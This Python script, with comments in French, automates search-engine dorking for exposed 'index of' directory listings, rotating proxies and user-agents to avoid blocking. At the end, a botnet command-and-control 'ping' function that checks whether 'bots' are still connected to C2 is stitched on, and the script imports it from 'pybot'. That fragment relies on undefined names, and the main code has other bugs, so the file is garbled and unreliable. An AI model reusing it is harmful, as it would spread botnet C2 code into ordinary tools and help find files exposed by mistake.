#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Script de Recherche Avancée et Détection de Répertoires
Version : 2.3.0
Auteur  : Platon-Y pour pctamalou.fr
Date    : 27 octobre 2024
Mise à jour de la version initiale du 15 août 2017

Description :
Ce script permet d'effectuer des recherches avancées dans des moteurs de recherche en ligne de commande,
en ciblant les répertoires ouverts ou les pages contenant des fichiers, avec une option de gestion de CAPTCHA.
Fonctionnalités principales :
- Recherche de liens "index of" et "parent directory"
- Gestion avancée de l'interface utilisateur en couleur
- Détection automatique et résolution des CAPTCHA via le navigateur
- Sauvegarde des résultats avec suppression des doublons
- Export des résultats en format JSON et texte
- Compatibilité multi-moteur (Google, Bing, DuckDuckGo, etc.)

Usage :
1. Pour une recherche avancée par défaut :
   - Lancer le script et sélectionner l'option de recherche par défaut (mots-clés seulement).
2. Pour une recherche personnalisée :
   - Spécifier un moteur de recherche, des mots-clés, et des types de fichiers spécifiques.
   - L'utilisateur peut choisir de rechercher dans des répertoires "index of" ou "parent directory".
"""

import requests
from bs4 import BeautifulSoup
import random
import time
import webbrowser
import json
from colorama import init, Fore, Style
from tqdm import tqdm
import logging
from urllib.parse import quote
from pybot import ping

# Initialisation de colorama pour la couleur en terminal
init(autoreset=True)

# Configuration du logging pour les erreurs
logging.basicConfig(filename='search_errors.log', level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

# Rotation de proxies publics
proxies = [
   {"http": "http://165.225.76.206:10605", "https": "https://165.225.76.206:10605"},
    {"http": "http://45.77.199.251:8080", "https": "https://45.77.199.251:8080"},
    {"http": "http://144.217.7.157:9300", "https": "https://144.217.7.157:9300"},
    {"http": "http://103.216.82.18:6666", "https": "https://103.216.82.18:6666"},
    {"http": "http://51.158.68.26:8811", "https": "https://51.158.68.26:8811"},
    # Ajouter davantage de proxies ici
]

# Rotation de User-Agents pour éviter le blocage
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    # Ajoutez davantage de User-Agents ici
]

# Liste des moteurs de recherche
engines = {
    "google": "https://www.google.com/search?q={}",
    "bing": "https://www.bing.com/search?q={}",
    "duckduckgo": "https://duckduckgo.com/?q={}",
    "qwant": "https://www.qwant.com/?q={}",
    "mojeek": "https://www.mojeek.com/search?q={}",
    "brave": "https://search.brave.com/search?q={}",
    "gigablast": "https://www.gigablast.com/search?q={}",
    "startpage": "https://www.startpage.com/sp/search?q={}",
    "swisscows": "https://swisscows.com/web?query={}",
    "yahoo": "https://search.yahoo.com/search?p={}",
    "ask": "https://www.ask.com/web?q={}",
    "baidu": "https://www.baidu.com/s?wd={}"
}

# Construire l'URL de recherche selon les paramètres
def build_search_url(query, engine, filetype=None, advanced=False):
    file_filter = f" filetype:{filetype}" if filetype else ""
    advanced_filter = " intitle:'index of' OR 'parent directory'" if advanced else ""
    full_query = f"{query}{file_filter} {advanced_filter}"
    return engines[engine].format(quote(full_query))

# Vérifie si une réponse contient un CAPTCHA
def detect_captcha(response_text):
    captcha_keywords = ["captcha", "verify", "not a robot"]
    return any(keyword in response_text.lower() for keyword in captcha_keywords)

# Ouvre le CAPTCHA dans le navigateur pour résolution manuelle
def open_browser_for_captcha(url):
    print(Fore.YELLOW + "CAPTCHA détecté. Ouverture du navigateur pour résolution manuelle...")
    webbrowser.open(url)
    input(Fore.LIGHTGREEN_EX + "Appuyez sur Entrée une fois que vous avez résolu le CAPTCHA dans le navigateur...")

# Récupération des résultats de recherche avec gestion des CAPTCHA et des proxies
def fetch_search_results(query, engine, filetype=None, advanced=False):
    url = build_search_url(query, engine, filetype, advanced)
    headers = {"User-Agent": random.choice(user_agents)}
    proxy = random.choice(proxies)
    try:
        response = requests.get(url, headers=headers, proxies=proxy, timeout=10)
        response.raise_for_status()
        
        # Détecte si un CAPTCHA est présent
        if detect_captcha(response.text):
            open_browser_for_captcha(url)
            response = requests.get(url, headers=headers, proxies=proxy, timeout=10)  # Relance la requête après résolution
        
        # Analyse du contenu de la réponse
        soup = BeautifulSoup(response.text, 'html.parser')
        results = []
        for item in soup.find_all('h3'):
            link_tag = item.find_parent("a")
            if link_tag and link_tag.get('href'):
                results.append((item.text, link_tag['href']))
        return results
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Erreur lors de la connexion à {engine} avec le proxy {proxy}: {e}")
        logging.error(f"Erreur lors de la connexion à {engine} avec le proxy {proxy}: {e}")
        return []

# Génération de variantes de requêtes
def generate_query_variations(base_query):
    keywords = ["index.of", "parent directory", "backup", "downloads", "files", "documents"]
    return [f"{base_query} intitle:'{kw}'" for kw in keywords]

# Recherche avec variantes et enregistrement des résultats
def search_with_variations(base_query, engine, filetype=None):
    query_variations = generate_query_variations(base_query)
    all_results = []
    for query in query_variations:
        print(Fore.CYAN + f"\n🔍 Recherche avec la requête : {query}")
        results = fetch_search_results(query, engine, filetype, advanced=True)
        all_results.extend(results)
        time.sleep(1)  # Pause pour éviter le blocage
    if all_results:
        save_results(all_results, "resultats_repertoires.txt")
        save_results_json(all_results, "resultats_repertoires.json")
    else:
        print(Fore.YELLOW + "⚠️ Aucun lien trouvé.")

# Sauvegarde des résultats dans un fichier texte
def save_results(results, filename):
    unique_results = list(set(results))  # Suppression des doublons
    with open(filename, "w", encoding="utf-8") as file:
        for title, link in unique_results:
            file.write(f"{title}\n{link}\n\n")
    print(Fore.GREEN + f"📁 Résultats sauvegardés dans {filename}")

# Sauvegarde des résultats en JSON
def save_results_json(results, filename):
    unique_results = list(set(results))
    results_dict = [{"title": title, "link": link} for title, link in unique_results]
    with open(filename, "w", encoding="utf-8") as file:
        json.dump(results_dict, file, indent=4, ensure_ascii=False)
    print(Fore.GREEN + f"📁 Résultats sauvegardés en JSON dans {filename}")

# Recherche avancée multi-moteur avec support des CAPTCHA
def perform_deep_search(query, engines=None):
    engines = engines or list(engines.keys())
    print(Fore.MAGENTA + "\nLancement de la recherche avancée sur plusieurs moteurs...")
    all_results = []
    for engine in engines:
        print(Fore.BLUE + f"\n🔍 Recherche sur {engine.capitalize()}")
        results = fetch_search_results(query, engine, advanced=True)
        all_results.extend(results)
        time.sleep(1)  # Pause entre chaque moteur
    if all_results:
        save_results(all_results, "resultats_avances.txt")
        save_results_json(all_results, "resultats_avances.json")
    else:
        print(Fore.YELLOW + "⚠️ Aucun résultat trouvé.")

# Interaction utilisateur
def user_interaction():
    while True:
        use_default = input(Fore.LIGHTWHITE_EX + "Utiliser la recherche avancée par défaut (mots-clés seulement) ? (oui/non) : ").lower()
        if use_default == "oui":
            query = input("Entrez votre requête de recherche : ")
            perform_deep_search(query)
        else:
            engine = input(Fore.LIGHTWHITE_EX + "Choisissez un moteur de recherche (google, bing, etc.) : ").lower()
            if engine not in engines:
                print(Fore.RED + "⚠️ Moteur de recherche non supporté.")
                continue

            query = input("Entrez votre requête de recherche : ")
            advanced = input("Chercher des répertoires 'index of' et 'parent directory' ? (oui/non) : ").lower() == 'oui'
            filetype = input("Type de fichier (ex : pdf, mp3, txt) : ").lower()

            if advanced:
                search_with_variations(query, engine, filetype)
            else:
                results = fetch_search_results(query, engine, filetype, advanced=False)
                if results:
                    save_results(results, "resultats_simple.txt")
                    save_results_json(results, "resultats_simple.json")
                else:
                    print(Fore.YELLOW + "⚠️ Aucun résultat trouvé.")

        if input("Voulez-vous continuer ? (oui/non) : ").lower() != 'oui':
            break

if __name__ == "__main__":
    user_interaction()



-     

def ping():
    """ check if all bots are still connected to C2 """
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)
